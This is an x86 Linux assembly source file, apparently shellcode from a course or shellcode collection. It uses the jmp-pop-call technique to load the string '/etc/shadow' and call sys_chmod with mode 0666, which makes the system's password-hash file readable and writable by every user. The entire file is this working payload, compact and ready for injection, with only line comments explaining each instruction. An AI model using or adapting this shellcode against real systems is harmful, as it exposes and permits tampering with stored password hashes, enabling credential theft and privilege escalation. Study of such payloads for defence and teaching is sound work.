; Filename; asm_linx86_chmod_sample2-alt_jmppopcall.asm
; Author hodorsec

global _start
section .text

_start:
	; Clear registers
	xor eax, eax			; Clearing for EAX
	mov ecx, eax			; Clear for ECX
    	jmp short string      ; Jump to function to pop string

append:
    	pop ebx                     ; Put string reference in EBX
	mov cx, 0x1b6			; Octal representation of 0666 for mode argument
	mov al, 0xf			; Put value for syscall 15 sys_chmod in AL (EAX)
	int 0x80			; Syscall

	xor eax, eax			; Clear EAX

	; sys_exit
	; void exit(int status);
	mov al, 1			; Move 1 into AL for exit
	int 0x80			; Syscall

string:
	call append
	AppendString db "/etc/shadow"		; size 11

